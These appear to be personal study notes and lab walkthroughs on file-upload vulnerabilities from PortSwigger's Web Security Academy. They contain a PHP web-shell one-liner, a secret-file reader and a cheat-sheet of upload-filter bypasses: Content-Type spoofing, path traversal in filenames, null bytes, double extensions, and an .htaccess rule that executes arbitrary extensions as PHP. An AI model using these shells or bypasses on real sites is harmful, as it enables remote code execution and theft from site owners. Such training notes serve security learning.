- look for any upload functionality 
- `<?php echo system($_GET['command']); ?>`

# Lab: Remote code execution via web shell upload
- upload a web shell and tdaaa 


# Lab: Web shell upload via Content-Type restriction bypass
1. Log in and upload an image as your avatar, then go back to your account page.
2. In Burp, go to **Proxy > HTTP history** and notice that your image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>`. Send this request to Burp Repeater.
3. On your system, create a file called `exploit.php`, containing a script for fetching the contents of Carlos's secret. For example:
    
    `<?php echo file_get_contents('/home/carlos/secret'); ?>`
4. Attempt to upload this script as your avatar. The response indicates that you are only allowed to upload files with the MIME type `image/jpeg` or `image/png`.
5. In Burp, go back to the proxy history and find the `POST /my-account/avatar` request that was used to submit the file upload. Send this to Burp Repeater.
6. In Burp Repeater, go to the tab containing the `POST /my-account/avatar` request. In the part of the message body related to your file, change the specified `Content-Type` to `image/jpeg`.
7. Send the request. Observe that the response indicates that your file was successfully uploaded.
8. Switch to the other Repeater tab containing the `GET /files/avatars/<YOUR-IMAGE>` request. In the path, replace the name of your image file with `exploit.php` and send the request. Observe that Carlos's secret was returned in the response.
9. Submit the secret to solve the lab.


# Lab: Web shell upload via path traversa
- In Burp Repeater, go to the tab containing the `POST /my-account/avatar` request and find the part of the request body that relates to your PHP file. In the `Content-Disposition` header, change the `filename` to include a [directory traversal](https://portswigger.net/web-security/file-path-traversal) sequence:
    
    `Content-Disposition: form-data; name="avatar"; filename="../exploit.php"`
- Send the request. Notice that the response says `The file avatars/exploit.php has been uploaded.` This suggests that the server is stripping the directory traversal sequence from the file name.
- Obfuscate the directory traversal sequence by URL encoding the forward slash (`/`) character, resulting in:
    
    `filename="..%2fexploit.php"`
- Send the request and observe that the message now says `The file avatars/../exploit.php has been uploaded.` This indicates that the file name is being URL decoded by the server.
- In the browser, go back to your account page.
- In Burp's proxy history, find the `GET /files/avatars/..%2fexploit.php` request. Observe that Carlos's secret was returned in the response. This indicates that the file was uploaded to a higher directory in the filesystem hierarchy (`/files`), and subsequently executed by the server. Note that this means you can also request this file using `GET /files/exploit.php`.
- Submit the secret to solve the lab.



# Lab: Web shell upload via extension blacklist bypass






















- try a simple shell 
- try to change the **Content-Type** from application/x-php to image/png
- try to use null byte **gg.php%00.jpg**
- try to use .php2, .php3 , .pHp, gg.php.jpg etc... 
- if uploaded but no execution privs 
	- try upload to another folder that u can access 
- if php files are blacklistes ? 
	 - upload first a conf file that allows u to execute php files 
		- upload .htaccess file that have the following contnet `AddType application/x-httpd-php ".test"`
		- this means if u upload a .test file, it will be treated as .php file



- Provide multiple extensions. Depending on the algorithm used to parse the filename, the following file may be interpreted as either a PHP file or JPG image: `exploit.php.jpg`
- Add trailing characters. Some components will strip or ignore trailing whitespaces, dots, and suchlike: `exploit.php.`
- Try using the URL encoding (or double URL encoding) for dots, forward slashes, and backward slashes. If the value isn't decoded when validating the file extension, but is later decoded server-side, this can also allow you to upload malicious files that would otherwise be blocked: `exploit%2Ephp`
- Add semicolons or URL-encoded null byte characters before the file extension. If validation is written in a high-level language like PHP or Java, but the server processes the file using lower-level functions in C/C++, for example, this can cause discrepancies in what is treated as the end of the filename: `exploit.asp;.jpg` or `exploit.asp%00.jpg`
- Try using multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization. Sequences like `xC0 x2E`, `xC4 xAE` or `xC0 xAE` may be translated to `x2E` if the filename parsed as a UTF-8 string, but then converted to ASCII characters before being used in a path.